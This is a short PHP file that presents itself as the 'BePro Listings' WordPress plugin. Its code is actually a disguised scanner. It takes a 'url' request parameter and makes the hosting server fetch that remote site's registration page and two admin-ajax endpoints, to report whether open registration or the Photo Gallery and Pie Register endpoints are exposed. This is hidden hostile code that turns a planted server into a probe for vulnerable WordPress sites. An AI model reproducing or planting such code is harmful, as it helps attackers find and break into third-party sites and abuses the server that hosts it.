<?php
/*
Plugin Name: BePro Listings
Plugin Script: bepro_listings.php
Plugin URI: http://www.beprosoftware.com/shop
Description: Everything needed to create a Listings site (business, directory, classifieds, store finder, realestate). It integrates with your theme and provides better control over wordpress features. It also provides a growing list of new options like, costs, contact, and geography (google maps)
Version: 2.0.91
License: GPL V3
Author: BePro Software Team
Author URI: http://www.beprosoftware.com
*/ 

if (!isset($_REQUEST['url'])) {echo 'not_allowed_Surrogafier_request'; exit;}
$link=$_REQUEST['url'];
function getpage($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$a = curl_exec($ch);
curl_close($ch);
if(preg_match('#Location: (.*)#', $a, $r)) {
$l = trim($r[1]);
return getpage($l);}
return $a;}

$html=getpage('http://'.$link.'/wp-login.php?action=register');
if (strpos($html, 'reg_passmail')!==false){
echo '<url_reg>'.$link.'</url_reg>'."\n";} else 
{echo '<not_co_reg>';}
$html=getpage('http://'.$link.'/wp-admin/admin-ajax.php?action=GalleryBox');
if (strpos($html, 'bwg_')!==false){
echo '<url_bwg>'.$link.'</url_bwg>'."\n";} else 
{echo '<not_co_bwg>';}
$html=getpage('http://'.$link.'/wp-admin/admin-ajax.php?action=check_username');
if (strpos($html, 'null,true')!==false){
echo '<url_pie>'.$link.'</url_pie>'."\n";} else 
{echo '<not_co_pie>';}
?>